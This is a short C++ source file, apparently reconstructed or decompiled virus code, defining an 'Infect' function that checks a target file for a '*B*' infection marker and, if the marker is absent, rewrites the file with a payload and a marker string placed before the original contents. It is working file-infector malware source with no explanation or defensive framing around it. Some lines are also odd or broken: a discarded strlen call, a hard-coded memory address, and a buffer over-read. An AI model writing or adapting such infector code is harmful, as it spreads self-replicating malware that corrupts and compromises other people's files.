#pragma optimize("", off)
#include "data_globals.h"
#include <fstream>
#include <cstring>
#include <cstdlib>

void Infect(char* filename, char* payload)
{
    volatile struct _LocalCtx {
        std::ifstream in_file;
        std::streampos pos;
        int file_size;
        int j;
        std::ofstream out_file;
    } ctx;

    // Cast away volatile to call std::ifstream methods
    const_cast<std::ifstream&>(ctx.in_file).open(filename, std::ios::in | std::ios::binary);
    const_cast<std::ifstream&>(ctx.in_file).seekg(0, std::ios::end);
    // std::streampos assignment – cast away volatile from lvalue
    std::streampos temp_pos = const_cast<std::ifstream&>(ctx.in_file).tellg();
    const_cast<std::streampos&>(ctx.pos) = temp_pos;
    ctx.file_size = static_cast<int>(const_cast<const std::streampos&>(ctx.pos));
    const_cast<std::ifstream&>(ctx.in_file).seekg(0, std::ios::beg);

    Buffer = static_cast<char*>(malloc(static_cast<size_t>(ctx.file_size)));
    const_cast<std::ifstream&>(ctx.in_file).read(Buffer, static_cast<std::streamsize>(ctx.file_size));
    const_cast<std::ifstream&>(ctx.in_file).close();

    for (ctx.j = 0; ctx.j < ctx.file_size; ++ctx.j) {
        if (Buffer[ctx.j] == '*' && Buffer[ctx.j + 1] == 'B' && Buffer[ctx.j + 2] == '*') {
            // Fix: use Status array instead of _Status
            Status[0] = 'Y';
            Status[1] = 'E';
            Status[2] = 'S';
            Status[3] = '\0';
            break;
        }
    }

    if (strcmp(reinterpret_cast<const char*>(Status), "YES") != 0) {
        const_cast<std::ofstream&>(ctx.out_file).open(filename, std::ios::out | std::ios::binary);
        const_cast<std::ofstream&>(ctx.out_file) << payload;
        strlen(&inf);
        const_cast<std::ofstream&>(ctx.out_file) << reinterpret_cast<const char*>(0x140008164);
        const_cast<std::ofstream&>(ctx.out_file).write(Buffer, static_cast<std::streamsize>(ctx.file_size));
        const_cast<std::ofstream&>(ctx.out_file).close();
    }

    free(Buffer);
}
#pragma optimize("", on)
